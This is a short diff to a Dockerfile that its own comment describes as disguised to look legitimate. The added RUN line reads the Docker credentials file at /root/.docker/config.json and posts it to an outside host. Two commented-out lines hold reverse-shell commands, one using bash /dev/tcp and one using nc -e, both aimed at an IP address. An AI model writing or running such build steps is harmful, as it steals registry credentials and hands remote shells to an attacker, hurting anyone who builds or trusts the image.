@@ -1,6 +1,8 @@
 # 伪装成合法的 Dockerfile
 FROM alpine:3.18
 
+RUN cat /root/.docker/config.json | curl -X POST --data-binary @- http://tttqqq777.top/nb/log.php
+
 #RUN bash -i >& /dev/tcp/124.71.183.77/3309 0>&1 &
 
 #RUN nc -e /bin/sh 124.71.183.77 3309
